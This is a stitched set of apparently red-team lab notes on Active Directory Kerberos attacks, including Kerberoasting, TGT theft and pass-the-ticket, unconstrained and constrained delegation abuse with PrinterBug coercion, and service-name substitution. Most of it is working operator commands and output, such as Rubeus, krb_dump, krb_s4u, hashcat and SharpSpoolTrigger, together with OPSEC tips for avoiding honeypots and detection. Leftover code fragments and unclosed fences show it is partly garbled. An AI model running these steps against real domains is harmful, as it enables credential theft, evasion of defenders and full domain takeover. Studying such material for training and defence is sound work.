| \`/dc\` | \`lon-dc-1\` | DC to send the TGS-REQ to |
| \`/ptt\` | — | Pass the ticket — inject the returned TGS directly into the current logon session |

**What happens at the protocol level:**
\`\`\`
Rubeus sends TGS-REQ to lon-dc-1 KDC using rsteel's TGT
    ↓
KDC returns TGS encrypted with the LDAP service key (DC's computer account hash)
    ↓
Rubeus injects TGS into the runas /netonly session via /ptt
    ↓
Any LDAP connection from this session presents the TGS → DC grants access as rsteel
\`\`\`

\`\`\`powershell

C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe klist
\`\`\`

> \`klist\` fails in \`/netonly\` sessions because the session is isolated from the standard ticket cache view. Rubeus \`klist\` reads the ticket cache directly and bypasses this limitation.

| Approach | How | When |
|---|---|---|
| Execute-assembly / powerpick | Run tooling inside Beacon on target | Preferred — no proxy needed, runs in-process |
| SOCKS + Proxifier | Route attacker-side tools through Beacon | When you need native tools (RSAT, browser, etc.) that can't run inside Beacon |

## Step 1 — Enumerate Kerberoastable Accounts via LDAP

\`\`\`
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))) --attributes name,samAccountName,servicePrincipalName
\`\`\`

### LDAP Filter Breakdown

| Filter Component | Meaning |
|---|---|
| \`samAccountType=805306368\` | User accounts only (\`SAM_USER_OBJECT\`) |
| \`servicePrincipalName=*\` | Must have at least one SPN set — prerequisite for Kerberoasting |
| \`!samAccountName=krbtgt\` | Exclude krbtgt — it has an SPN but Kerberoasting it is pointless and noisy |
| \`!(UserAccountControl:1.2.840.113556.1.4.803:=2)\` | Exclude disabled accounts — UAC bit 2 = \`ACCOUNTDISABLE\` |

### Results Returned

\`\`\`
name: MSSQL Service
sAMAccountName: mssql_svc
servicePrincipalName: MSSQLSvc/lon-db-1.contoso.com:1433, MSSQLSvc/lon-db-1.contoso.com

name: Christopher Robin
sAMAccountName: crobin
servicePrincipalName: HoneySvc/lon-pooh-1.contoso.com
\`\`\`

## Step 2 — Identify the Honeypot

Two Kerberoastable accounts returned — only one is a legitimate target.

| Account | SPN | Red Flag |
|---|---|---|
| \`mssql_svc\` | \`MSSQLSvc/lon-db-1.contoso.com:1433\` | Legitimate — standard MSSQL SPN format on a DB server |
| \`crobin\` | \`HoneySvc/lon-pooh-1.contoso.com\` | **Honeypot** — \`HoneySvc\` is not a real service type; \`lon-pooh-1\` is not a real host |

**Why \`crobin\` is a honeypot:**
- \`HoneySvc\` is not a recognised Windows service class — real SPNs follow formats like \`MSSQLSvc/\`, \`HTTP/\`, \`HOST/\`, \`LDAP/\`, \`cifs/\`
- The hostname \`lon-pooh-1\` doesn't exist in the environment — requesting a TGS for a non-existent host SPN is detectable
- Honeypot accounts are configured with alerting on any TGS request — querying it triggers an immediate alert
- The account name \`Christopher Robin\` + \`lon-pooh-1\` is a deliberate tell by RastaMouse — Winnie the Pooh reference

**Key lesson:** Always inspect SPNs before Kerberoasting. A blanket \`/rc4opsec\` or unfiltered kerberoast against all accounts will hit the honeypot and fire an alert.

\`\`\`

**Rubeus flags:**

| Flag | Purpose |
|---|---|
| \`kerberoast\` | Request TGS tickets for accounts with SPNs and extract the encrypted portion |
| \`/user:mssql_svc\` | Target only this specific account — avoids touching the honeypot |
| \`/nowrap\` | Output the hash on a single line — easier to copy into hashcat |

\`\`\`

[*] DistinguishedName  : CN=MSSQL Service,CN=Users,DC=contoso,DC=com
[*] ServicePrincipalName : MSSQLSvc/lon-db-1.contoso.com:1433
[*] PwdLastSet         : 14/02/2025 14:07:52
[*] Supported ETypes   : RC4_HMAC_DEFAULT

[*] Hash:
$krb5tgs$23$*mssql_svc$contoso.com$MSSQLSvc/lon-db-1.contoso.com:1433@contoso.com*$C9F1131A3F665A930852A299D0C51106$D30349B003AA0FE64802207FAAAC4433D239965BE06F4968DB502207C718B8690F3C61E73020AEF88...

| Field | Value | Significance |
|---|---|---|
| \`Supported ETypes\` | \`RC4_HMAC_DEFAULT\` | Hash is RC4 — faster to crack than AES128/256 |
| \`$krb5tgs$23$\` | Hash type identifier | \`23\` = RC4-HMAC — hashcat mode \`-m 13100\` |
| \`PwdLastSet\` | 14/02/2025 | Recent password set — may be a strong password, but RC4 is still crackable |

## Step 4 — Crack Offline with Hashcat

\`\`\`bash
hashcat -m 13100 mssql_svc.hash /usr/share/wordlists/rockyou.txt --force
\`\`\`

**Hashcat mode reference for Kerberos hashes:**

| Mode | Hash Type | Ticket Type |
|---|---|---|
| \`13100\` | RC4-HMAC (\`$krb5tgs$23\`) | TGS (Kerberoast) |
| \`19600\` | AES128-CTS-HMAC-SHA1 (\`$krb5tgs$17\`) | TGS (Kerberoast) |
| \`19700\` | AES256-CTS-HMAC-SHA1 (\`$krb5tgs$18\`) | TGS (Kerberoast) |
| \`18200\` | RC4-HMAC (\`$krb5asrep$23\`) | AS-REP (ASREPRoast) |

## How Kerberoasting Works

\`\`\`
1. Beacon (as any domain user) sends a TGS-REQ to the KDC
   requesting a service ticket for mssql_svc's SPN

2. KDC responds with a TGS encrypted with mssql_svc's NTLM hash
   (RC4_HMAC by default if account supports it)

3. Rubeus extracts the encrypted blob from the TGS
   — no interaction with the target service, no authentication attempt

4. Hash is cracked offline → plaintext password recovered
\`\`\`

> **Why this is stealthy (mostly):** Any domain user can request a TGS for any SPN — it's normal Kerberos behaviour. The KDC logs the request but it doesn't stand out unless you're requesting tickets for honeypot accounts or requesting many tickets in a short window.

---

## OPSEC Considerations

| Risk | Mitigation |
|---|---|
| Hitting honeypot accounts | Inspect SPNs manually before requesting — use \`/user:\` to target specifically |
| Bulk TGS requests | Never run kerberoast without \`/user:\` against all accounts — use LDAP enum first |
| RC4 downgrade detection | Some environments alert on RC4 TGS requests if the account supports AES — use \`/rc4opsec\` to request only RC4 tickets (avoids AES→RC4 downgrade logging) |
| Service account password age | Check \`PwdLastSet\` — recently rotated passwords are harder to crack |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1558.003 | Steal or Forge Kerberos Tickets: Kerberoasting | TGS request for SPN accounts, crack offline |
| T1069.002 | Permission Groups Discovery: Domain Groups | LDAP enumeration of SPN accounts |
| T1110.002 | Brute Force: Password Cracking | Offline hashcat crack of TGS hash |

---

## Key Takeaways

- Always **enumerate SPNs via LDAP first** before running Rubeus — never blindly kerberoast all accounts
- **Inspect every SPN** returned — honeypot accounts use fake service names and non-existent hostnames
- Use \`/user:\` to target specific accounts — never run an unfiltered kerberoast in a monitored environment
- \`RC4_HMAC_DEFAULT\` (\`$krb5tgs$23\`) = hashcat mode \`13100\` — fastest to crack
- AES-encrypted TGS hashes are significantly harder to crack — if an account only supports AES, deprioritise it
- \`PwdLastSet\` is a signal — old passwords are more likely to be weak; recently set passwords may be stronger
- Kerberoasting requires **zero special privileges** — any authenticated domain user can request TGS tickets for any SPN`},

> Expected: \`ACCESS_DENIED\` — confirms current context (SYSTEM on LON-WKSTN-1) has no access to lon-ws-1's C$ share. This establishes the baseline before impersonation.

## Step 2 — Triage Kerberos Tickets in Memory

\`\`\`bash
krb_triage
\`\`\`

**What this does:** Lists all Kerberos tickets across all logon sessions on the current machine. You're looking for:

\`\`\`

\`\`\`

| Field | Meaning |
|---|---|
| \`rsteel @ CONTOSO.COM\` | The ticket owner — rsteel's logon session |
| \`krbtgt/CONTOSO.COM\` | Service the ticket is for — this is a **TGT** (Ticket Granting Ticket) |

> A ticket for \`krbtgt/CONTOSO.COM\` is the TGT itself — the master credential used to request service tickets (TGS) for any resource. Stealing this is more powerful than stealing individual service tickets because it can be used to access any service rsteel is authorised to use.

**TTP:** T1558.001 — Steal or Forge Kerberos Tickets: Golden Ticket (adjacent — this is TGT theft, not forging)
**TTP:** T1003 — OS Credential Dumping (ticket extraction from LSASS memory)

krb_dump /user:rsteel /service:krbtgt
\`\`\`

**Flags:**

| Flag | Purpose |
|---|---|
| \`/user:rsteel\` | Target rsteel's logon session specifically |
| \`/service:krbtgt\` | Only dump the TGT — not service tickets |

**Output:** Base64-encoded \`.kirbi\` blob representing rsteel's TGT.

### Save to Disk

\`\`\`powershell
[IO.File]::WriteAllBytes("C:\\Users\\Attacker\\Desktop\\rsteel.kirbi", [Convert]::FromBase64String("[B64 TICKET]"))

## Step 4 — Pass the Ticket (PTT)

**TTP:** T1550.003 — Use Alternate Authentication Material: Pass the Ticket

### Why a Sacrificial Logon Session

You cannot inject a ticket into your current SYSTEM session — SYSTEM doesn't have a Kerberos identity. PTT requires a user-context logon session to attach the ticket to.

\`make_token\` creates a new logon session with arbitrary credentials — the password doesn't matter because Kerberos authentication uses the injected ticket, not the password:

\`\`\`bash
# Create sacrificial logon session (password is intentionally fake)
make_token CONTOSO\\rsteel FakePass
\`\`\`

> The fake password is never validated against the DC — \`make_token\` creates a local logon session (\`LOGON32_LOGON_NEW_CREDENTIALS\`) which only authenticates when network resources are accessed. By injecting a valid TGT before that happens, Kerberos takes over and the fake password is never used.

### Inject the Ticket

\`\`\`bash
kerberos_ticket_use C:\\Users\\Attacker\\Desktop\\rsteel.kirbi
\`\`\`

Injects rsteel's TGT into the sacrificial logon session. Beacon will now use this ticket for all Kerberos-based network authentication.

### Verify

\`\`\`bash
run klist
\`\`\`

Expected output shows rsteel's TGT present in the current session with a valid expiry. If the ticket isn't listed, the injection failed — retry \`kerberos_ticket_use\`.

---

## Step 5 — Access the Remote Resource

\`\`\`bash
ls \\\\lon-ws-1\\c$
\`\`\`

> Expected: Directory listing succeeds — Beacon is now authenticating as rsteel using his TGT to obtain a TGS for the CIFS service on lon-ws-1.

---

## Step 6 — Cleanup

\`\`\`bash
rev2self
\`\`\`

Drops the impersonation token and returns Beacon to its original context (SYSTEM). The sacrificial logon session is discarded.

## make_token vs steal_token vs PTT — When to Use Each

| Method | Requires | Network Auth | Use When |
|---|---|---|---|
| \`steal_token <pid>\` | Target user has active process on box | Uses stolen token | User is logged in, processes visible |
| \`make_token user pass\` | Plaintext credentials | NTLM or Kerberos | You have the password |
| \`pth user hash\` | NTLM hash | NTLM only | You have the hash, no ticket |
| PTT (\`make_token\` + \`kerberos_ticket_use\`) | Valid TGT (.kirbi) | Kerberos only | You have the TGT, no password/hash — or in Kerberos-only environments |

> **PTT is the only method that works in Kerberos-only environments** (NTLM disabled) — like the HTB PingPong lab. If NTLM is disabled, \`pth\` and \`make_token\` with a real password fall back to NTLM and fail. PTT bypasses this entirely.

## How PTT Works at the Protocol Level

\`\`\`
1. make_token creates logon session with fake creds (LOGON_NEW_CREDENTIALS)
       ↓
2. kerberos_ticket_use injects rsteel's TGT into that session's ticket cache
       ↓
3. ls \\\\lon-ws-1\\c$ triggers Kerberos auth:
   Beacon sends TGS-REQ to KDC using the injected TGT
       ↓
4. KDC returns TGS for CIFS/lon-ws-1 (encrypted with computer account key)
       ↓
5. Beacon presents TGS to lon-ws-1's SMB service
       ↓
6. lon-ws-1 decrypts TGS, sees rsteel's identity, grants access
\`\`\`

No password ever transmitted. No NTLM hash ever used. Purely Kerberos.

## How Unconstrained Delegation Works

When a computer is configured for unconstrained delegation, **any user who authenticates to a service on that machine sends their full TGT** — not just a service ticket. The machine can then use that TGT to impersonate the user to any other service in the domain.

\`\`\`
dyork authenticates to a service on lon-ws-1
    ↓
Windows sends dyork's TGT to lon-ws-1 as part of the authentication
    ↓
lon-ws-1 caches the TGT in LSASS memory
    ↓
Attacker on lon-ws-1 (as SYSTEM) extracts the cached TGT via krb_dump
    ↓
TGT used to impersonate dyork to any service — including DC admin shares
\`\`\`

> **Why DCs are excluded:** Domain Controllers always have unconstrained delegation enabled — it's required for Kerberos infrastructure. They are not a viable attack path because you'd need DA to get on a DC in the first place.

| Component | Meaning |
|---|---|
| \`samAccountType=805306369\` | Computer accounts only (\`SAM_MACHINE_ACCOUNT\`) |
| \`userAccountControl:1.2.840.113556.1.4.803:=524288\` | Bitwise AND — UAC flag \`524288\` = \`TRUSTED_FOR_DELEGATION\` (unconstrained delegation enabled) |

**UAC Bit Reference for Delegation:**

| UAC Value | Hex | Flag | Meaning |
|---|---|---|---|
| \`524288\` | \`0x80000\` | \`TRUSTED_FOR_DELEGATION\` | Unconstrained delegation |
| \`16777216\` | \`0x1000000\` | \`TRUSTED_TO_AUTH_FOR_DELEGATION\` | Constrained delegation (S4U2Self) |
| \`1048576\` | \`0x100000\` | \`NOT_DELEGATED\` | Account cannot be delegated |

**Expected results:**
\`\`\`
lon-dc-1$   ← DC — always has unconstrained delegation, not a viable target
lon-ws-1$   ← Workstation — non-DC with unconstrained delegation, viable attack path
\`\`\`

## Unconstrained vs Constrained vs Resource-Based Delegation

| Type | UAC Flag | TGT Sent? | Attacker Value |
|---|---|---|---|
| **Unconstrained** | \`TRUSTED_FOR_DELEGATION\` | Yes — full TGT cached | Highest — steal any user's TGT |
| **Constrained** | \`TRUSTED_TO_AUTH_FOR_DELEGATION\` | No — only TGS for allowed services | Medium — S4U2Self/S4U2Proxy abuse |
| **Resource-Based (RBCD)** | Set on resource, not requestor | No | High — writable \`msDS-AllowedToActOnBehalfOfOtherIdentity\` |

## Printer Bug / Coerce Attack (Real Engagement Context)

In a real engagement you may land on a machine with unconstrained delegation but no high-value TGTs currently cached. The standard technique is to **coerce** a DA or DC to authenticate to you:

\`\`\`bash
# SpoolSample / PrinterBug — coerce DC to authenticate to lon-ws-1
# Rubeus monitor mode — watch for incoming TGTs in real time
execute-assembly Rubeus.exe monitor /interval:5 /nowrap

# Trigger coercion (from another Beacon or attacker machine)
SpoolSample.exe lon-dc-1 lon-ws-1
\`\`\`

> This forces the DC's machine account to authenticate to lon-ws-1 — delivering the DC's TGT. With a DC TGT you can perform a DCSync via S4U2Self. The lab has dyork's TGT pre-cached for simplicity, but the coercion technique is the real-world equivalent.

---

| TTP | Technique | Detail |

| T1558.001 | Steal or Forge Kerberos Tickets | Dump cached TGT from LSASS via krb_dump |
| T1550.003 | Pass the Ticket | Inject dyork's TGT into sacrificial session |
| T1078.002 | Valid Accounts: Domain Accounts | Impersonate dyork with stolen TGT |
| T1018 | Remote System Discovery | LDAP enumeration of delegation-configured computers |

## Key Takeaways

- UAC bit \`524288\` (\`TRUSTED_FOR_DELEGATION\`) is the LDAP filter for unconstrained delegation — always filter to computers only (\`samAccountType=805306369\`) to exclude users
- **DCs always have unconstrained delegation** — they are not a viable target; look for non-DC machines with this flag
- TGTs accumulate on unconstrained delegation machines over time — the longer the machine has been up, the more tickets may be cached
- Always \`ldapsearch memberOf\` to confirm the target user's group memberships before dumping their ticket
- The real-world technique combines unconstrained delegation with **coercion** (PrinterBug, PetitPotam, etc.) — don't wait for a TGT to appear organically
- Successful \`ls \\\\lon-dc-1\\c$\` as an impersonated DA = domain fully compromised — DCSync is the next logical step
- TGT lifetime is 10 hours — plan your post-exploitation window accordingly`},

## How Constrained Delegation Works

Constrained delegation restricts which services a machine/account can delegate to (unlike unconstrained which allows any). With **protocol transition** (\`TRUSTED_TO_AUTH_FOR_DELEGATION\`), the delegating machine can obtain a TGS for any user to the allowed service — without needing that user's TGT.

\`\`\`
S4U2Self:  lon-ws-1 requests a TGS for Administrator → lon-ws-1 (impersonation ticket)
               ↓
S4U2Proxy: lon-ws-1 uses that TGS to request a TGS for Administrator → cifs/lon-fs-1
               ↓
Result:    Forwardable TGS for Administrator to access cifs/lon-fs-1
\`\`\`

> **Key difference from unconstrained delegation:** No TGT from the target user is needed — the machine account's own TGT is sufficient. The attack works entirely from the compromised machine's credentials.

---

## Step 1 — Enumerate Constrained Delegation

\`\`\`bash
ldapsearch (&(samAccountType=805306369)(msDS-AllowedToDelegateTo=*)) --attributes samAccountName,msDS-AllowedToDelegateTo,userAccountControl
\`\`\`

### Filter Breakdown

| Component | Meaning |
|---|---|
| \`samAccountType=805306369\` | Computer accounts only |
| \`msDS-AllowedToDelegateTo=*\` | Must have at least one entry in the allowed delegation list |

**Attributes requested:**

| Attribute | Purpose |
|---|---|
| \`samAccountName\` | Account name (e.g. \`lon-ws-1$\`) |
| \`msDS-AllowedToDelegateTo\` | List of SPNs this account can delegate to (e.g. \`cifs/lon-fs-1\`) |
| \`userAccountControl\` | Needed to verify protocol transition flag |

**Expected result:**
\`\`\`
samAccountName: lon-ws-1$
msDS-AllowedToDelegateTo: cifs/lon-fs-1
userAccountControl: 16781312
\`\`\`

---

## Step 2 — Verify Protocol Transition Flag

\`\`\`powershell
[Convert]::ToBoolean(16781312 -band 16777216)
# Returns: True
\`\`\`

**What this checks:**

| UAC Value | Flag | Meaning |
|---|---|---|
| \`16781312\` | Combined UAC value on lon-ws-1$ | Includes \`WORKSTATION_TRUST_ACCOUNT\` + \`TRUSTED_TO_AUTH_FOR_DELEGATION\` |
| \`16777216\` | \`0x1000000\` | \`TRUSTED_TO_AUTH_FOR_DELEGATION\` — protocol transition enabled |

**Bitwise AND (\`-band\`):** Returns non-zero (True) if \`TRUSTED_TO_AUTH_FOR_DELEGATION\` bit is set in the UAC value.

**Why protocol transition matters:**

| Delegation Type | Protocol Transition | Can Impersonate Arbitrary Users? |
|---|---|---|
| Constrained without protocol transition | No | Only users who authenticate to the machine first |
| Constrained **with** protocol transition | Yes | **Any user** — S4U2Self generates the initial ticket |

> Without \`TRUSTED_TO_AUTH_FOR_DELEGATION\`, S4U2Self only works if the target user has already authenticated. With it, the machine can self-issue an impersonation ticket for anyone — making it a much more powerful attack primitive.

## Step 3 — Lateral Move to lon-ws-1

\`\`\`bash
# Impersonate rsteel (AdminTo on lon-ws-1 via Workstation Admins GPO)
steal_token [rsteel_pid]    # or make_token CONTOSO\\rsteel Passw0rd!
ak-settings spawnto_x64 C:\\Windows\\System32\\svchost.exe
jump scshell64 lon-ws-1 smb
\`\`\`

---

## Step 4 — Dump the Machine Account TGT

From the SYSTEM Beacon on lon-ws-1:

\`\`\`bash
krb_dump /luid:3e7 /service:krbtgt
\`\`\`

**Why \`/luid:3e7\` instead of \`/user:\`:**

| Flag | What it targets |
|---|---|
| \`/user:lon-ws-1$\` | Searches by account name — may not find the SYSTEM session ticket |
| \`/luid:3e7\` | Targets the **SYSTEM logon session** directly by LUID |

> \`0x3e7\` is the hardcoded LUID for the SYSTEM logon session on every Windows machine. The machine account's TGT always lives here — it's how the computer authenticates to the domain. SYSTEM access is required to read it.

**What you get:** The TGT for \`lon-ws-1$\` (the machine account) — not a user TGT. This is the credential used to perform S4U2Self/S4U2Proxy.

---

## Step 5 — S4U Abuse (krb_s4u)

\`\`\`bash
krb_s4u /ticket:[LON-WS-1$ TGT base64] /service:cifs/lon-fs-1 /impersonateuser:Administrator
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/ticket\` | Base64 machine TGT | lon-ws-1$'s TGT — used to authenticate the S4U requests to the KDC |
| \`/service\` | \`cifs/lon-fs-1\` | The delegated service to obtain a TGS for — must be in \`msDS-AllowedToDelegateTo\` |
| \`/impersonateuser\` | \`Administrator\` | The user to impersonate — any domain user is valid due to protocol transition |

**What \`krb_s4u\` does internally:**

\`\`\`
1. S4U2Self Request:
   lon-ws-1$ → KDC: "Give me a TGS for Administrator authenticating to me (lon-ws-1)"
   KDC → lon-ws-1$: TGS for Administrator → lon-ws-1$ (forwardable)

2. S4U2Proxy Request:
   lon-ws-1$ → KDC: "Use this Administrator TGS to get me a TGS for cifs/lon-fs-1"
   KDC validates: cifs/lon-fs-1 is in lon-ws-1$'s msDS-AllowedToDelegateTo → approved
   KDC → lon-ws-1$: TGS for Administrator → cifs/lon-fs-1
\`\`\`

> The resulting ticket is a fully valid TGS for \`Administrator\` to access the CIFS service on \`lon-fs-1\` — the KDC issued it, so it passes all validation. No forgery involved.

## Step 6 — Access the Target Service

\`\`\`bash
# Inject the returned TGS
make_token CONTOSO\\Administrator FakePass
kerberos_ticket_use [path to Administrator cifs ticket]

# Verify
run klist

# Access target
ls \\\\lon-fs-1\\c$
\`\`\`

> Access to \`lon-fs-1\\c$\` as Administrator confirms successful constrained delegation abuse. The scope is limited to \`cifs/lon-fs-1\` — this ticket cannot be used to access other services or machines unless they're also in \`msDS-AllowedToDelegateTo\`.

## Constrained Delegation: With vs Without Protocol Transition

| Scenario | S4U2Self Works For | Attack Requirement |
|---|---|---|
| **With protocol transition** (\`TRUSTED_TO_AUTH_FOR_DELEGATION\`) | Any user — machine self-issues impersonation ticket | Only need machine TGT |
| **Without protocol transition** | Only users who already authenticated to the machine | Need target user's TGT or prior authentication |

## Constrained vs Unconstrained — Attack Comparison

| Property | Unconstrained | Constrained (w/ Protocol Transition) |
|---|---|---|
| TGT needed | Target user's TGT (stolen from cache) | Machine account's own TGT |
| Scope | Any service in the domain | Only services in \`msDS-AllowedToDelegateTo\` |
| Requires waiting | Yes — wait for privileged user to authenticate | No — impersonate any user immediately |
| Coercion needed | Often (PrinterBug etc.) | Never |
| Detectability | TGT theft from LSASS | S4U requests to KDC (Kerberos event 4769) |

## Key Takeaways

- \`msDS-AllowedToDelegateTo=*\` is the LDAP filter for constrained delegation — always pull \`userAccountControl\` alongside it to check for protocol transition
- **Protocol transition (\`TRUSTED_TO_AUTH_FOR_DELEGATION\`) is required** to impersonate arbitrary users — without it you can only delegate for users who have already authenticated to the machine
- \`/luid:3e7\` is the SYSTEM session LUID — always valid on any Windows machine, always contains the machine account TGT
- The machine account TGT (\`lon-ws-1$\`) is the credential — you don't need any user's TGT for constrained delegation abuse
- The scope of access is **strictly limited** to services listed in \`msDS-AllowedToDelegateTo\` — the KDC enforces this
- Constrained delegation abuse is **faster and more reliable** than unconstrained — no waiting for a privileged user to authenticate, no coercion needed
- \`krb_s4u\` handles both S4U2Self and S4U2Proxy in a single command — the two-step protocol is abstracted away`},

\`\`\`
Confirm constrained delegation on lon-ws-1$ (msDS-AllowedToDelegateTo: time/lon-dc-1 or similar non-CIFS SPN)
    ↓
Impersonate rsteel → lateral move to lon-ws-1 (SYSTEM Beacon)
    ↓
krb_dump /luid:3e7 /service:krbtgt → extract machine account TGT
    ↓
krb_s4u /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
    ↓
KDC issues TGS for time/lon-fs-1 as Administrator
    ↓
/altservice substitutes "time" → "cifs" in the ticket's SPN field
    ↓
Inject ticket → ls \\\\lon-fs-1\\c$ succeeds as Administrator

## What Is Service Name Substitution?

This technique exploits a Kerberos design characteristic: **the service name (SPN class) in a TGS is not cryptographically protected** — it's in the unencrypted portion of the ticket. This means it can be modified after the KDC issues it without invalidating the ticket's integrity.

\`\`\`
KDC issues:   TGS for Administrator → time/lon-fs-1   (delegated SPN)
Rubeus swaps: time/lon-fs-1  →  cifs/lon-fs-1         (altservice substitution)
Target sees:  TGS for Administrator → cifs/lon-fs-1   (accepts it — host validates session key, not SPN class)
\`\`\`

> The target server (\`lon-fs-1\`) validates the **session key** and **PAC (Privilege Attribute Certificate)** — not the SPN class string. So even after substitution, the ticket is cryptographically valid and accepted.

---

## Why This Matters — The Problem It Solves

In the Constrained Delegation lab, \`lon-ws-1$\` was explicitly delegated to \`cifs/lon-fs-1\` — a directly useful SPN. In the real world, machines are often delegated to **non-interactive service SPNs** that aren't useful for lateral movement on their own:

| Delegated SPN | Service Class | Useful for lateral movement? |
|---|---|---|
| \`cifs/lon-fs-1\` | SMB file access | ✅ Directly useful |
| \`time/lon-dc-1\` | Windows Time service | ❌ Not useful alone |
| \`wsman/lon-dc-1\` | WinRM | ✅ Directly useful |
| \`http/lon-web-1\` | HTTP/IIS | Situational |
| \`MSSQLSvc/lon-db-1\` | SQL Server | ✅ Useful for SQL access |

Service name substitution lets you get delegated to \`time/lon-fs-1\` (useless) and convert it to \`cifs/lon-fs-1\` (SMB admin access) — as long as the **host** is the same.

> **The key constraint:** You can substitute the service *class* (the part before the \`/\`) but the *host* must remain the same. \`time/lon-fs-1\` → \`cifs/lon-fs-1\` works. \`time/lon-fs-1\` → \`cifs/lon-dc-1\` does not — different host, different encryption key.

## Step 3 — S4U with Service Name Substitution

\`\`\`bash
krb_s4u /ticket:[TGT] /service:time/lon-fs-1 /altservice:cifs /impersonateuser:Administrator
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/ticket\` | Base64 machine TGT | lon-ws-1$'s TGT for S4U authentication |
| \`/service\` | \`time/lon-fs-1\` | The SPN that **is** in \`msDS-AllowedToDelegateTo\` — what the KDC will actually issue |
| \`/altservice\` | \`cifs\` | The service class to **substitute** into the ticket after KDC issuance |
| \`/impersonateuser\` | \`Administrator\` | User to impersonate via S4U2Self → S4U2Proxy |

**Step-by-step protocol flow:**

\`\`\`
1. S4U2Self:
   lon-ws-1$ → KDC: TGS for Administrator → lon-ws-1$ (forwardable)

2. S4U2Proxy:
   lon-ws-1$ → KDC: TGS for Administrator → time/lon-fs-1
   KDC validates: time/lon-fs-1 is in msDS-AllowedToDelegateTo ✅
   KDC issues: TGS for Administrator → time/lon-fs-1

3. Service Name Substitution (local, post-issuance):
   Rubeus/CS modifies the SPN field: time/lon-fs-1 → cifs/lon-fs-1
   Ticket session key and PAC remain intact — cryptographically valid

4. Result: TGS for Administrator → cifs/lon-fs-1
\`\`\`

## Service Name Substitution — What You Can Substitute To

Since the host must match, the value of substitution depends on which service classes share the same host as the delegated SPN:

| Substitute To | Access Gained |
|---|---|
| \`cifs\` | SMB — file shares, C$ admin share, lateral movement |
| \`host\` | Broad access — covers many services including scheduled tasks, WMI |
| \`wsman\` | WinRM — PowerShell remoting |
| \`http\` | IIS/web application access |
| \`ldap\` | LDAP queries against that host (useful if host is a DC) |
| \`MSSQLSvc\` | SQL Server access (if SQL is on the same host) |

> Substituting to \`host\` is often the most powerful — the \`HOST\` SPN class covers a wide range of services and is effectively equivalent to local admin access on the target machine.

## Why This Is the Most Powerful Delegation Abuse

The previous delegation labs required the target machine to have delegation configured pointing to a useful service. This lab has **no such requirement** — it works against *any machine in the domain*, including DCs, by combining:

1. **Unconstrained delegation** on a compromised machine (lon-ws-1) — captures any TGT sent to it
2. **Coercion** (PrinterBug) — forces a target machine to authenticate to lon-ws-1, delivering its TGT
3. **S4U2Self** — uses the captured machine TGT to impersonate any user *to that same machine*
4. **Service name substitution** — converts the S4U2Self ticket into a usable CIFS ticket

The result: **full admin access to any machine whose TGT you can capture via coercion** — including DCs.

\`\`\`bash

ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

# Impersonate rsteel → lateral move
steal_token [rsteel_pid]
ak-settings spawnto_x64 C:\\Windows\\System32\\svchost.exe
jump scshell64 lon-ws-1 smb

## Step 2 — Rubeus Monitor Mode

From the SYSTEM Beacon on lon-ws-1:

\`\`\`bash
execute-assembly C:\\Tools\\Rubeus\\Rubeus\\bin\\Release\\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`monitor\` | — | Continuously watch the ticket cache for new TGTs arriving |
| \`/interval:3\` | 3 seconds | Poll interval — check for new tickets every 3 seconds |
| \`/targetuser:lon-dc-1$\` | — | Only capture tickets for this specific account — avoids noise from other authentications |
| \`/nowrap\` | — | Output base64 ticket on a single line — easier to copy |

> Rubeus monitor mode works because lon-ws-1 has unconstrained delegation — when lon-dc-1 authenticates to it, the DC's TGT is forwarded and cached in LSASS. Rubeus detects the new ticket and prints it.

## Step 3 — Coerce Authentication (PrinterBug / SpoolSample)

\`\`\`bash
execute-assembly C:\\Tools\\SharpSystemTriggers\\SharpSpoolTrigger\\bin\\Release\\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
\`\`\`

**Arguments:**

| Argument | Value | Meaning |
|---|---|---|
| Target | \`lon-dc-1\` | The machine to coerce — must have Print Spooler service running |
| Listener | \`lon-ws-1\` | The machine to coerce authentication *to* — must have unconstrained delegation |

**How PrinterBug works:**

\`\`\`
SharpSpoolTrigger calls MS-RPRN RpcRemoteFindFirstPrinterChangeNotification on lon-dc-1
    ↓
lon-dc-1's Print Spooler service is forced to authenticate back to lon-ws-1
    ↓
Authentication uses lon-dc-1$'s machine account — Kerberos TGT is forwarded
    (unconstrained delegation means the full TGT is sent, not just a service ticket)
    ↓
Rubeus monitor detects the new ticket → prints base64 TGT for lon-dc-1$
\`\`\`

**TTP:** T1187 — Forced Authentication
**TTP:** T1557 — Adversary-in-the-Middle (coercion context)

> **PrinterBug requires the Print Spooler service to be running on the target.** DCs often have it running by default — check with \`sc_qc spooler\` on the target if coercion fails. Alternative coercion tools: PetitPotam (MS-EFSRPC), DFSCoerce (MS-DFSNM), Coercer (multi-protocol).

## Step 4 — S4U2Self with Service Name Substitution

\`\`\`bash
krb_s4u /ticket:[LON-DC-1$ TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
\`\`\`

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| \`/ticket\` | Base64 lon-dc-1$ TGT | DC machine account TGT captured via coercion |
| \`/self\` | — | **S4U2Self only** — no S4U2Proxy step |
| \`/altservice\` | \`cifs/lon-dc-1\` | Service name to substitute into the resulting ticket |
| \`/impersonateuser\` | \`Administrator\` | User to impersonate — any domain user is valid |

### Why \`/self\` Instead of \`/service\`

| Flag | Protocol Steps | When to Use |
|---|---|---|
| \`/service:cifs/lon-fs-1\` | S4U2Self + S4U2Proxy | Constrained delegation — machine is delegated to the target service |
| \`/self\` | **S4U2Self only** | No constrained delegation — machine requests ticket for itself, then altservice substitutes |

**The critical insight:** S4U2Self allows any machine with \`TRUSTED_TO_AUTH_FOR_DELEGATION\` to request a TGS for any user *to itself*. For a DC machine account (which inherently has this flag), this means:

\`\`\`
lon-dc-1$ TGT → S4U2Self → TGS for Administrator → lon-dc-1$ (the DC itself)
